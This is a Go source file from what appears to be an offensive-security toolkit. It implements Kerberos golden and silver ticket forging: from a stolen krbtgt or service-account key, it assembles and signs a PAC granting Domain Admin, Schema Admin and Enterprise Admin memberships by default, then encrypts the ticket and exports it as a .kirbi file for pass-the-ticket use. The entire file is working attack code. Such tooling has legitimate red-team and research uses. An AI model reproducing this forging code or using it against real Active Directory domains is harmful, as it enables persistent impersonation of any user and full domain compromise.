package kerberos

import (
	"crypto/rand"
	"encoding/asn1"
	"fmt"
	"strings"
	"time"

	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/credcache/kirbi"
	kerbcrypto "github.com/TheManticoreProject/Manticore/network/kerberos/v5/crypto"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/iana"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/messages"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/pac"
	msdtyp "github.com/TheManticoreProject/Manticore/windows/ms-dtyp"
)

// Ticket forging (golden and silver tickets)
//
// A golden ticket is a Ticket-Granting Ticket (SName krbtgt/REALM) forged and
// signed with the domain krbtgt account's long-term key; a silver ticket is a
// single service ticket (SName service/host) forged with a service account's
// long-term key. In both cases the caller supplies the compromised key (an RC4
// NT hash or an AES key) together with the target identity (realm, user,
// RID/SID, group RIDs) and validity window; this file assembles a matching PAC,
// signs it, builds and encrypts the EncTicketPart, and emits a Ticket plus a
// KrbCredInfo that Export/import (.kirbi, ccache) and the SPNEGO client consume.
//
// The PAC carries the server signature and the KDC (privsvr) signature ([MS-PAC]
// 2.8). For a golden ticket the "server" is krbtgt, so both signatures use the
// krbtgt key; for a silver ticket both use the service key (the holder never
// contacts the KDC, and services do not verify the KDC signature by default).
//
// Diamond and sapphire tickets — which re-use a legitimately issued PAC instead
// of a fully fabricated one — build on the same primitives and live in
// diamond_sapphire.go: they NDR-decode an existing KERB_VALIDATION_INFO (via the
// pac package) rather than assembling one from scratch, then re-sign with the
// helpers here.

// AD-type numbers ([MS-KILE] 3.4.5.3 / RFC 4120 5.2.6) for embedding the PAC.
const (
	adTypeIfRelevant = 1   // AD-IF-RELEVANT wrapper
	adTypeWin2KPAC   = 128 // AD-WIN2K-PAC
)

// defaultUserAccountControl is USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD,
// the account-control bits Windows records in the PAC for an ordinary enabled
// user account.
const defaultUserAccountControl = 0x00000200 | 0x00010000

// ForgeOptions describes the identity and validity of a forged ticket. The zero
// value is not valid: Realm, Username, DomainSID, and Key must be set.
type ForgeOptions struct {
	// Realm is the Kerberos realm (AD domain DNS name); it is uppercased.
	Realm string
	// Username is the client account's sAMAccountName the ticket impersonates.
	Username string
	// DomainSID is the account domain SID (e.g. "S-1-5-21-…"), used as the PAC
	// LogonDomainId; user and group SIDs are formed as DomainSID-<RID>.
	DomainSID string
	// UserRID is the impersonated account's RID (e.g. 500 for the built-in
	// Administrator).
	UserRID uint32
	// PrimaryGroupRID is the RID of the account's primary group (e.g. 513,
	// Domain Users). Defaults to 513 when zero.
	PrimaryGroupRID uint32
	// GroupRIDs are the RIDs of the account's groups in the account domain. When
	// empty a default privileged set (Domain Users/Admins, Schema/Enterprise
	// Admins, Group Policy Creator Owners) is used.
	GroupRIDs []uint32
	// ExtraSIDs are fully-qualified SIDs added to the PAC ExtraSids list (e.g.
	// the Enterprise Admins SID for a cross-domain golden ticket).
	ExtraSIDs []string
	// LogonDomainName is the account domain's NetBIOS name (PAC LogonDomainName).
	LogonDomainName string
	// LogonServer is the NetBIOS name of the authenticating DC (PAC LogonServer).
	LogonServer string
	// Key is the signing/encryption key: an RC4 NT hash (16 bytes) or an AES key
	// (16/32 bytes) of the krbtgt account (golden) or the service account (silver).
	Key []byte
	// KeyEType is the Kerberos encryption type of Key (23 = RC4, 17 = AES128,
	// 18 = AES256).
	KeyEType int
	// KvNo is the key version number recorded in the ticket enc-part (optional;
	// omitted when zero).
	KvNo int
	// SessionKey is the session key sealed in the ticket. A random key of
	// SessionEType is generated when nil.
	SessionKey []byte
	// SessionEType is the session key's encryption type (defaults to RC4).
	SessionEType int
	// StartTime is when the ticket becomes valid (defaults to now).
	StartTime time.Time
	// EndTime is the ticket's expiry (defaults to StartTime + 10 years).
	EndTime time.Time
	// RenewTill is the renewable lifetime end (defaults to EndTime).
	RenewTill time.Time
	// UserAccountControl overrides the PAC UserAccountControl flags (defaults to
	// a normal, non-expiring account).
	UserAccountControl uint32
}

// ForgedTicket is the result of forging a golden or silver ticket: a Ticket and
// the matching KrbCredInfo (session key, flags, times, principals). It can be
// serialized to a .kirbi (KirbiBytes) or imported directly into a KerberosClient
// (LoadTGT / LoadServiceTicket) for pass-the-ticket use.
type ForgedTicket struct {
	// Ticket is the forged Kerberos ticket (APPLICATION[1]).
	Ticket messages.Ticket
	// TicketRaw is the DER of Ticket, for verbatim re-emission in an AP-REQ.
	TicketRaw []byte
	// CredInfo describes the ticket for KRB-CRED export/import (session key,
	// flags, times, client and service principals).
	CredInfo messages.KrbCredInfo
	// SessionKey is the ticket session key (also present in CredInfo).
	SessionKey []byte
	// SessionEType is the session key's encryption type.
	SessionEType int
}

// KirbiBytes serializes the forged ticket as a .kirbi (DER KRB-CRED) with an
// unencrypted enc-part, ready for pass-the-ticket import.
func (f *ForgedTicket) KirbiBytes() ([]byte, error) {
	cred, err := kirbi.New(f.TicketRaw, f.CredInfo)
	if err != nil {
		return nil, err
	}
	return kirbi.Bytes(cred)
}

// ForgeGolden forges a golden ticket: a TGT for krbtgt/REALM signed with the
// domain krbtgt key supplied in opts.Key. Import the result with a client's
// LoadTGT (via KirbiBytes) to request service tickets from the KDC with no
// password.
func ForgeGolden(opts ForgeOptions) (*ForgedTicket, error) {
	realm := strings.ToUpper(opts.Realm)
	sname := messages.PrincipalName{
		NameType:   messages.NameTypeSRVInst,
		NameString: []string{"krbtgt", realm},
	}
	return forge(opts, sname, realm, true)
}

// ForgeSilver forges a silver ticket: a service ticket for the given SPN
// ("service/host") signed with that service account's key supplied in opts.Key.
// The ticket is presented directly to the service (no KDC round-trip); import it
// with LoadServiceTicket for use over SMB/RPC/LDAP.
func ForgeSilver(opts ForgeOptions, spn string) (*ForgedTicket, error) {
	realm := strings.ToUpper(opts.Realm)
	sname, err := parseSPN(spn, realm)
	if err != nil {
		return nil, fmt.Errorf("kerberos: forge silver: parse SPN %q: %w", spn, err)
	}
	return forge(opts, sname, realm, false)
}

// forge is the shared assembly path for golden and silver tickets. golden marks
// the ticket as an initial (AS-issued) TGT so the KDC treats it as a valid TGT.
func forge(opts ForgeOptions, sname messages.PrincipalName, srealm string, golden bool) (*ForgedTicket, error) {
	if err := validateForgeOptions(&opts); err != nil {
		return nil, err
	}

	// Times.
	start := opts.StartTime
	if start.IsZero() {
		start = time.Now().UTC()
	}
	start = start.UTC().Truncate(time.Second)
	end := opts.EndTime
	if end.IsZero() {
		end = start.AddDate(10, 0, 0)
	}
	renew := opts.RenewTill
	if renew.IsZero() {
		renew = end
	}

	// Session key.
	sessionEType := opts.SessionEType
	if sessionEType == 0 {
		sessionEType = iana.ETypeRC4HMAC
	}
	sessionKey := opts.SessionKey
	if sessionKey == nil {
		sessionKey = make([]byte, kerbcrypto.KeyLen(sessionEType))
		if _, err := rand.Read(sessionKey); err != nil {
			return nil, err
		}
	}

	cname := messages.PrincipalName{
		NameType:   messages.NameTypePrincipal,
		NameString: []string{opts.Username},
	}

	// Build, sign, and embed the PAC.
	authData, err := buildPACAuthData(&opts, start)
	if err != nil {
		return nil, err
	}

	return assembleForgedTicket(assembleParams{
		SName:        sname,
		SRealm:       srealm,
		CName:        cname,
		Initial:      golden,
		AuthData:     authData,
		Key:          opts.Key,
		KeyEType:     opts.KeyEType,
		KvNo:         opts.KvNo,
		SessionKey:   sessionKey,
		SessionEType: sessionEType,
		StartTime:    start,
		EndTime:      end,
		RenewTill:    renew,
	})
}

// assembleParams gathers the inputs assembleForgedTicket needs to build, encrypt,
// and package a ticket from an already-built authorization-data (PAC) element.
type assembleParams struct {
	SName        messages.PrincipalName
	SRealm       string
	CName        messages.PrincipalName
	Initial      bool // set the initial (AS-issued) ticket flag, i.e. a forged TGT
	AuthData     []messages.AuthorizationData
	Key          []byte // service/krbtgt key encrypting the enc-part
	KeyEType     int
	KvNo         int
	SessionKey   []byte
	SessionEType int
	StartTime    time.Time
	EndTime      time.Time
	RenewTill    time.Time
}

// assembleForgedTicket builds the EncTicketPart, encrypts it with the supplied
// key (ticket key usage 2), and returns a ForgedTicket with the matching
// KrbCredInfo. It is the shared assembly tail for golden/silver forging and for
// the sapphire graft (which supplies a genuine, re-signed PAC as AuthData).
func assembleForgedTicket(p assembleParams) (*ForgedTicket, error) {
	// Ticket flags: forwardable + renewable + pre-authent (+ initial for a TGT).
	flagBits := []int{
		messages.TicketFlagForwardable,
		messages.TicketFlagRenewable,
		messages.TicketFlagPreAuthent,
	}
	if p.Initial {
		flagBits = append(flagBits, messages.TicketFlagInitial)
	}
	flags := messages.NewKerberosFlags(flagBits...)

	encPart := messages.EncTicketPart{
		Flags:             flags,
		Key:               messages.EncryptionKey{KeyType: p.SessionEType, KeyValue: p.SessionKey},
		CRealm:            p.SRealm,
		CName:             p.CName,
		Transited:         messages.TransitedEncoding{TRType: 0, Contents: []byte{}},
		AuthTime:          p.StartTime,
		StartTime:         p.StartTime,
		EndTime:           p.EndTime,
		RenewTill:         p.RenewTill,
		AuthorizationData: p.AuthData,
	}
	encBytes, err := encPart.Marshal()
	if err != nil {
		return nil, fmt.Errorf("kerberos: marshal EncTicketPart: %w", err)
	}

	// Encrypt the enc-part with the service/krbtgt key (ticket key usage 2).
	cipher, err := kerbcrypto.Encrypt(p.KeyEType, p.Key, kerbcrypto.KeyUsageKDCRepTicket, encBytes)
	if err != nil {
		return nil, fmt.Errorf("kerberos: encrypt ticket enc-part: %w", err)
	}

	ticket := messages.Ticket{
		TktVno:  messages.KerberosV5,
		Realm:   p.SRealm,
		SName:   p.SName,
		EncPart: messages.EncryptedData{EType: p.KeyEType, KvNo: p.KvNo, Cipher: cipher},
	}
	ticketRaw, err := ticket.Marshal()
	if err != nil {
		return nil, fmt.Errorf("kerberos: marshal ticket: %w", err)
	}

	credInfo := messages.KrbCredInfo{
		Key:       messages.EncryptionKey{KeyType: p.SessionEType, KeyValue: p.SessionKey},
		PRealm:    p.SRealm,
		PName:     p.CName,
		Flags:     flags,
		AuthTime:  p.StartTime,
		StartTime: p.StartTime,
		EndTime:   p.EndTime,
		RenewTill: p.RenewTill,
		SRealm:    p.SRealm,
		SName:     p.SName,
	}

	return &ForgedTicket{
		Ticket:       ticket,
		TicketRaw:    ticketRaw,
		CredInfo:     credInfo,
		SessionKey:   p.SessionKey,
		SessionEType: p.SessionEType,
	}, nil
}

// validateForgeOptions checks the required fields and applies defaults for the
// primary group and account-control flags.
func validateForgeOptions(opts *ForgeOptions) error {
	if opts.Realm == "" {
		return fmt.Errorf("kerberos: forge: Realm is required")
	}
	if opts.Username == "" {
		return fmt.Errorf("kerberos: forge: Username is required")
	}
	if opts.DomainSID == "" {
		return fmt.Errorf("kerberos: forge: DomainSID is required")
	}
	if len(opts.Key) == 0 {
		return fmt.Errorf("kerberos: forge: Key is required")
	}
	if _, _, ok := pac.SignatureTypeForEType(opts.KeyEType); !ok {
		return fmt.Errorf("kerberos: forge: unsupported signing-key etype %d", opts.KeyEType)
	}
	if opts.PrimaryGroupRID == 0 {
		opts.PrimaryGroupRID = 513 // Domain Users
	}
	if opts.UserAccountControl == 0 {
		opts.UserAccountControl = defaultUserAccountControl
	}
	return nil
}

// defaultGroupRIDs is the privileged group set applied when the caller supplies
// none: Domain Users, Domain Admins, Schema Admins, Enterprise Admins, and Group
// Policy Creator Owners — the memberships that make a golden ticket effective.
var defaultGroupRIDs = []uint32{513, 512, 520, 518, 519}

// buildPACAuthData builds a KERB_VALIDATION_INFO, forges and signs the PAC, and
// wraps the PAC bytes in the AD-IF-RELEVANT → AD-WIN2K-PAC authorization-data
// element expected in a ticket enc-part.
func buildPACAuthData(opts *ForgeOptions, authTime time.Time) ([]messages.AuthorizationData, error) {
	info, err := buildLogonInfo(opts, authTime)
	if err != nil {
		return nil, err
	}

	p, err := pac.Forge(info, opts.Username, authTime, opts.KeyEType)
	if err != nil {
		return nil, err
	}
	// Golden: krbtgt is both the ticket server and the privsvr, so both PAC
	// signatures use the krbtgt key. Silver: the service key signs both (the KDC
	// signature is never verified by the service). Either way opts.Key signs both.
	pacBytes, err := p.Sign(opts.Key, opts.Key)
	if err != nil {
		return nil, fmt.Errorf("kerberos: sign PAC: %w", err)
	}
	return wrapPACInAuthData(pacBytes)
}

// wrapPACInAuthData wraps a marshaled PAC in the AD-WIN2K-PAC → AD-IF-RELEVANT
// authorization-data nesting expected in a ticket enc-part ([MS-KILE] 3.4.5.3).
// It is the inverse of extractWin2KPAC and is shared by golden/silver forging,
// diamond re-signing, and the sapphire graft.
func wrapPACInAuthData(pacBytes []byte) ([]messages.AuthorizationData, error) {
	innerDER, err := asn1.Marshal([]messages.AuthorizationData{
		{ADType: adTypeWin2KPAC, ADData: pacBytes},
	})
	if err != nil {
		return nil, fmt.Errorf("kerberos: marshal AD-WIN2K-PAC: %w", err)
	}
	return []messages.AuthorizationData{
		{ADType: adTypeIfRelevant, ADData: innerDER},
	}, nil
}

// buildLogonInfo assembles the KERB_VALIDATION_INFO for the impersonated user.
func buildLogonInfo(opts *ForgeOptions, authTime time.Time) (*pac.KERB_VALIDATION_INFO, error) {
	domainSID, err := msdtyp.ParseSID(opts.DomainSID)
	if err != nil {
		return nil, fmt.Errorf("kerberos: parse DomainSID %q: %w", opts.DomainSID, err)
	}

	groupRIDs := opts.GroupRIDs
	if len(groupRIDs) == 0 {
		groupRIDs = defaultGroupRIDs
	}
	groups := make([]pac.GROUP_MEMBERSHIP, len(groupRIDs))
	for i, rid := range groupRIDs {
		groups[i] = pac.GROUP_MEMBERSHIP{RelativeId: rid, Attributes: pac.DefaultGroupAttributes}
	}

	var extraSids []pac.KERB_SID_AND_ATTRIBUTES
	var userFlags uint32
	for _, s := range opts.ExtraSIDs {
		sid, perr := msdtyp.ParseSID(s)
		if perr != nil {
			return nil, fmt.Errorf("kerberos: parse ExtraSID %q: %w", s, perr)
		}
		sidCopy := sid
		extraSids = append(extraSids, pac.KERB_SID_AND_ATTRIBUTES{
			Sid:        &sidCopy,
			Attributes: pac.DefaultGroupAttributes,
		})
	}
	if len(extraSids) > 0 {
		userFlags |= 0x20 // ExtraSids present ([MS-PAC] 2.5, UserFlags bit D)
	}

	never := pac.NeverExpireFileTime()
	logon := pac.FileTimeFromTime(authTime)
	info := &pac.KERB_VALIDATION_INFO{
		LogonTime:          logon,
		LogoffTime:         never,
		KickOffTime:        never,
		PasswordLastSet:    pac.FILETIME{},
		PasswordCanChange:  pac.FILETIME{},
		PasswordMustChange: never,
		EffectiveName:      pac.NewUnicodeString(opts.Username),
		FullName:           pac.NewUnicodeString(""),
		LogonScript:        pac.NewUnicodeString(""),
		ProfilePath:        pac.NewUnicodeString(""),
		HomeDirectory:      pac.NewUnicodeString(""),
		HomeDirectoryDrive: pac.NewUnicodeString(""),
		LogonCount:         0,
		BadPasswordCount:   0,
		UserId:             opts.UserRID,
		PrimaryGroupId:     opts.PrimaryGroupRID,
		GroupCount:         uint32(len(groups)),
		GroupIds:           groups,
		UserFlags:          userFlags,
		LogonServer:        pac.NewUnicodeString(opts.LogonServer),
		LogonDomainName:    pac.NewUnicodeString(opts.LogonDomainName),
		LogonDomainId:      &domainSID,
		UserAccountControl: opts.UserAccountControl,
		SidCount:           uint32(len(extraSids)),
		ExtraSids:          extraSids,
	}
	return info, nil
}
